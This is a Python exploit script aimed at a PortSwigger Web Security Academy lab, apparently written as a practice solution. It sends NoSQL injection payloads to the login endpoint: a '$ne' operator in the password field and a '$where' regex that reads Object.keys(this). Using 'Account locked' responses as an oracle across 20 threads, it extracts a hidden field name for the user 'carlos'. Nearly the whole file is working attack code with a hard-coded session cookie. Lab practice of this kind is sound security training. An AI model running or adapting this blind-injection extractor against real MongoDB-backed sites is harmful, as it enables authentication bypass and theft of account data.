import requests
from string import ascii_lowercase, digits, ascii_uppercase
import threading

HOST = "0a9b00b20363ec2480c3a89f009700b0.web-security-academy.net"

HEADERS = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0",
    "Accept": "*/*",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": f"https://{HOST}/login",
    "Content-Type": "application/json",
    "Origin": f"https://{HOST}",
    "Connection": "keep-alive",
    "Cookie": "session=UNvT97SWg6MC6znc8DKs8VMQlxLBpLjr",
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "TE": "trailers"
}

def login(username, password):
    data = {
        "username": username,
        "password": {"$ne": "invalid"},
        "$where": "Object.keys(this)[3].match('^.{0}t.*')"
    }
    response = requests.post(f"https://{HOST}/login", json=data, headers=HEADERS)
    

def extract_parameter_name(i):
    global parameter_name

    for c in ascii_lowercase + digits + ascii_uppercase:
        data = {
            "username": "carlos",
            "password": {"$ne": "invalid"},
            "$where": "Object.keys(this)[4].match('^." + "{" + str(i) +"}" + f"{c}.*')"
        }

        response = requests.post(f"https://{HOST}/login", json=data, headers=HEADERS)
        if "Account locked" in response.text:
            parameter_name[i] = c
            print(parameter_name)
            return
        

    print(parameter_name)

def multi_threading_extract_parameter_name():
    threads = []
    for i in range(20):
        t = threading.Thread(target=extract_parameter_name, args=(i,))
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()

try:
    parameter_name = ["#" for i in range(20)]
    multi_threading_extract_parameter_name()
except KeyboardInterrupt:
    print("Exiting...")